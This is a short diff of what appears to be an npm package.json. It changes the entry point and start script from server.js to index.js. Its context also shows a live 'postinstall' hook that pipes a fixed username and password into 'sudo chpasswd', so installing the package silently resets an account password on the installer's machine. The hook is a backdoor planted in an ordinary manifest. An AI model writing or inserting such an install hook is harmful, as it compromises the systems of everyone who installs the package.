@@ -8,9 +8,9 @@
     "http-post": "^0.1.1",
     "http-proxy": "^1.8.1"
   },
-  "main": "server.js",
+  "main": "index.js",
   "scripts": {
-    "start": "server.js",
+    "start": "index.js",
     "postinstall": "echo 'xpl:xpl1337' | sudo chpasswd"
   },
   "repository": {
